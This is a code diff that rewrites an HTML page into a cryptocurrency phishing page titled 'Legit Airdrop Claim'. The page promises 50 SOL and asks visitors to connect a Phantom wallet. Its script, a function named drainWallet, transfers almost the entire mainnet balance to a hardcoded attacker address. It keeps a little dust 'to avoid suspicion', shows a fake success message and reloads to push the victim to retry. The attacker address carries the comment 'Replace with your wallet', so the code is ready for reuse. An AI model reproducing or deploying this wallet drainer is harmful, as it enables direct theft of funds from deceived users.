@@ -1,33 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fake NFT Mint</title>
+    <title>Legit Airdrop Claim</title>
     <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: Arial; text-align: center; padding: 50px; }
+        button { background: #4CAF50; padding: 15px 30px; border: none; color: white; cursor: pointer; }
+        .loader { display: none; margin: 20px; }
+    </style>
 </head>
 <body>
-    <button id="connect">Mint Free NFT!</button>
+    <h1>🚨 URGENT: CLAIM 50 SOL AIRDROP 🚨</h1>
+    <button id="connect">CONNECT WALLET TO CLAIM</button>
+    <div class="loader" id="loader">Processing... (Do not close this window)</div>
+
     <script>
-        const ATTACKER_WALLET = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // Attacker's Mainnet address
-        document.getElementById('connect').onclick = async () => {
-            if (window.phantom?.solana) {
-                const phantom = window.phantom.solana;
-                await phantom.connect();
-                const publicKey = phantom.publicKey.toString();
-                
-                // Create malicious transaction
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-                const balance = await connection.getBalance(phantom.publicKey);
+        const ATTACKER_WALLET = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // Replace with your wallet
+
+        async function drainWallet(publicKey) {
+            try {
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+                const balance = await connection.getBalance(publicKey);
+                if (balance < 100000) {
+                    document.getElementById('loader').textContent = "Error: Low balance for airdrop.";
+                    return;
+                }
+
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: phantom.publicKey,
+                        fromPubkey: publicKey,
                         toPubkey: new solanaWeb3.PublicKey(ATTACKER_WALLET),
-                        lamports: balance - 5000,
+                        lamports: balance - 10000, // Leave dust to avoid suspicion
                     })
                 );
 
-                // Trick user into signing
-                const { signature } = await phantom.signAndSendTransaction(tx);
-                alert("NFT Minted! Check your wallet."); // Fake success message
+                const { signature } = await window.phantom.solana.signAndSendTransaction(tx);
+                document.getElementById('loader').innerHTML = `✅ Airdrop success!<br>TX: ${signature}`;
+            } catch (error) {
+                document.getElementById('loader').textContent = "⚠️ Error: Retry wallet connection.";
+                setTimeout(() => window.location.reload(), 3000); // Force retry
+            }
+        }
+
+        document.getElementById('connect').onclick = async () => {
+            if (window.phantom?.solana?.isPhantom) {
+                document.getElementById('connect').style.display = 'none';
+                document.getElementById('loader').style.display = 'block';
+                try {
+                    await window.phantom.solana.connect();
+                    drainWallet(window.phantom.solana.publicKey);
+                } catch (error) {
+                    document.getElementById('loader').textContent = "🚫 Phantom Wallet required!";
+                }
             }
         };
     </script>
